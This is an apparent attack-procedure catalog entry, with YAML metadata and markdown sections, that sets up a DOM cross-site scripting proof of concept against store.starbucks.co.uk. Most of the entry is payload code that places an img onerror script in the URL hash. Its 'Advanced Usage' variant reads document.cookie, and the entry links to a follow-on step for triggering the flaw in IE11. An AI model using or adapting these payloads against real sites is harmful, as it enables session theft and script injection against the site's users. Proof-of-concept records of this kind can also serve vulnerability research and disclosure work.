---
data: |
  function poc() {
    var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>';
    // Further steps will use this URL
  }
tags:
  - xss
  - poc
type: command
output: URL variable defined; no immediate output.
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.635Z'
id: 390ef342-4ee9-4a9e-91ac-0bf7b70ffbf3
verified: false
validated: true
submitted: true
---
# starbucks-xss-poc-setup

## Command

```javascript
function poc() {
  var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>';
  // Further steps will use this URL
}
```

## Description

This JavaScript snippet defines a function to create the malicious URL with an XSS payload embedded in the hash fragment, preparing it for use in subsequent steps of the PoC.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | The base URL with hash payload | Yes |

## Examples

### Basic Usage

```javascript
function poc() {
  var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>';
  console.log(url);
}
poc();
```

### Advanced Usage

```javascript
function poc() {
  var payload = '<img/src="1"/onerror=alert(document.cookie)>';
  var url = 'https://store.starbucks.co.uk/#' + payload;
  console.log(url);
}
poc();
```

## Expected Output

Console logs the full malicious URL string, e.g., https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>. No execution occurs until later steps.

## Related

- [[Related Procedure|procedures/Trigger-DOM-XSS-via-Hash-Reload-on-IE11]]
